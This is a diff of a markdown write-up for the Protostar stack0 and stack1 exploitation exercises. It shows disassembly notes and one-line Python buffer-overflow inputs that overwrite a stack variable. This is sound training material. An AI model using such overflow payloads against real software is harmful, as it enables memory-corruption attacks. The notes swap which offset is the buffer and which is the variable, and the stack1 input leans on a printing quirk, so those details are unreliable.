@@ -1,5 +1,14 @@
 # the solutions of protostar
 
+## table of content
+
+- [the solutions of protostar](#the-solutions-of-protostar)
+  - [table of content](#table-of-content)
+  - [stack0](#stack0)
+    - [stack0 solution](#stack0-solution)
+  - [stack1](#stack1)
+    - [stack1 solution](#stack1-solution)
+
 ## stack0
 
 ```asm
@@ -25,11 +34,37 @@ Dump of assembler code for function main:
    0x08048434 <+64>:    ret
 ```
 
-+ `[esp+0x1c]`: the variable
-+ `[esp+0x5c]`: the stack buffer
+- `[esp+0x1c]`: the variable
+- `[esp+0x5c]`: the stack buffer
 
-+ when input length > buffer.size, the bottom of the stack (ebp) gets overwrited
+- when input length > buffer.size, the bottom of the stack (ebp) gets overwrited
 
-+ **Think about the pointer. `buffer[65]` points to a higher address than `buffer[0]`.**
-+ The actual memory location of the `buffer` could be printed using `printf("%p\n", (void *) buffer)`, or `$esp+0x1c` @ `*main + 17`.
-+ Hence when the buffer overflows, the variable stored at `[esp+0x5c]` @ `*main + 9`, which is higher than the aforementioned `buffer`, will be overwritten eventually.
+- **Think about the pointer. `buffer[65]` points to a higher address than `buffer[0]`.**
+- The actual memory location of the `buffer` could be printed using `printf("%p\n", (void *) buffer)`, or `$esp+0x1c` @ `*main + 17`.
+- Hence when the buffer overflows, the variable stored at `[esp+0x5c]` @ `*main + 9`, which is higher than the aforementioned `buffer`, will be overwritten eventually.
+
+### stack0 solution
+
+```sh
+python3 -c "print('A' * 80)" | ./stack0
+```
+
+## stack1
+
+```asm
+   0x080484ab <+71>:    cmp    eax,0x61626364
+```
+
+```gdb
+r $(python3 -c 'print("A" * 64 + "BCDEFGHIJKLMNOPQRSTUVWXYZ")')
+r $(python3 -c "print(b'A' * 64 + b'\x42\x43\x44\x45')")
+  # the "b'" occupies 2 bytes
+b *main + 71
+info registers    # eax 0x45444342 
+```
+
+### stack1 solution
+
+```sh
+./stack1 $(python3 -c "print(b'A' * 62 + b'\x64\x63\x62\x61')")
+```
